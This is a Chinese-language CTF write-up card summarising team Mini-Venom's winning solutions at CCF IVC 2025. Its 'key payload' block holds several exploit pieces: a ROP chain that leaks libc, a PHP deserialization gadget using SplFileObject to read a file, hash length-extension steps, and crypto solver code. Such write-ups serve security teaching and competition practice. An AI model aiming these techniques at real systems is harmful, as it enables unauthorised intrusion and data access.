---
title: "首届CCF智能汽车大赛(CCF IVC 2025) Mini-Venom(第一名)"
category: pwn
tags: ["CCF智能汽车大赛", "pwn", "Pwn-ROP", "libc-2.27", "Web-Hash长度扩展", "PHP反序列化"]
signals: ["CCF智能汽车大赛 2025", "Pwn-ROP", "libc-2.27", "Web-Hash长度扩展", "PHP反序列化", "Maker+Post+SplFileObject", "git泄露", "Crypto-Pell方程", "ECDLP简化DLP", "file_read", "CCF", "IVC", "Mini-Venom", "pwn-3"]
difficulty: hard
source: "https://www.ctfiot.com/263528.html"
tools: ["C", "ROP", "gmpy2"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 首届CCF智能汽车大赛(CCF IVC 2025) Mini-Venom(第一名)

> 赛事：CCF智能汽车大赛 2025 | 方向：pwn | 难度：hard | 工具：C、ROP、gmpy2

## 一句话总结

首届CCF IVC 2025 Mini-Venom第一名:车联网pwn-3(0x88栈溢出+ret2libc)+easylogin(hash长度扩展)+serp(git+PHP反序列化SplFileObject读f1a9.php)+Curve(Pell方程x^2-Dy^2=1+ECDLP简化DLP+sieve_base爆破p+离散对数)+nfsr(128位LFSR+ff函数SHA512+bool约束爆破key)

## 攻击链

1. Pwn-3: pop_rdi+pop_rsi+write@plt+write_got+write(1,write_got)泄libc_base|easylogin: ?source=1源码+hash长度扩展+base64+token提交|serp: git泄露+posts.php Maker+Post+__toString+SplFileObject+__construct(''SplFileObject'', [''f1a9.php'', ''r''])|Curve: gx^2-D*gy^2-1=ax^2-D*ay^2-1移项gcd得p_approximate+sieve_base试除p+GF(p)iroot(D,2)+映射到x+dy离散对数discrete_log+share^pell_b XOR n_a+shared_secret=(share+share_inv)/2+AES-ECB解密|nfsr: lfsr 128位+ff(x1,x2,x3,x4) sha512+输出256位+循环300次爆破key

## 关键 payload

```
b''a''*0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)|a = new Maker(''SplFileObject'', [''f1a9.php'', ''r'']); b = (new Post(''test''))->setContent($a); c = [$b];|kp1 = gx**2 - D * gy**2 - 1; kp2 = ax**2 - D * ay**2 - 1; p_approximate = int(gcd(kp1, kp2)); for prime in sieve_base[:20]: if p_approximate % prime == 0: p = p_approximate // prime; if isPrime(p): break|F = GF(p); d = F(gmpy2.iroot(D,2)[0]); pell_g = F(G[0]) + F(G[1])*d; pell_a = F(A[0]) + F(A[1])*d; pell_b = F(B[0]) + F(B[1])*d; n_a = discrete_log(pell_a, pell_g); share = pell_b ^ n_a; share_inv = share ^ (-1); shared_secret = (share + share_inv) / F(2); key = sha256(long_to_bytes(int(shared_secret))).digest(); cipher = AES.new(key, AES.MODE_ECB); flag = cipher.decrypt(C)|lfsr(R, mask): R_bin[0]=s=sum(R_bin[i]*mask_bin[i])&1, R_bin = [s] + R_bin[:-1]|ff(x0,x1,x2,x3) = int(sha512(long_to_bytes(x0*x2+x0+x1^4+x3^5+x0*x1*x2*x3+(x1*x3)^4)).hexdigest(), 16) & 1
```

## 经验教训

1) 车联网pwn:pop_rdi+pop_rsi链泄libc_base=write_got leak+ret2libc system;2) hash长度扩展攻击:hash(secret+padding+append) + new_hash;3) SplFileObject反序列化读源:new Maker('SplFileObject', ['f1a9.php', 'r']);4) Pell方程解的gcd得p:gx^2-D*gy^2-1=ax^2-D*ay^2-1;5) 离散对数discrete_log(EG);6) LFSR+ff=bool约束爆破:循环300次稳定预测

## 标签

Pwn-ROP、libc-2.27、Web-Hash长度扩展、PHP反序列化、Maker+Post+SplFileObject、git泄露、Crypto-Pell方程、ECDLP简化DLP、sieve_base爆破、nfsr+ff函数、bool约束

## 参考来源

- https://www.ctfiot.com/263528.html
- 原文件：首届CCF智能汽车大赛(CCF_IVC_2025)_Mini-Venom(第一名).full.md
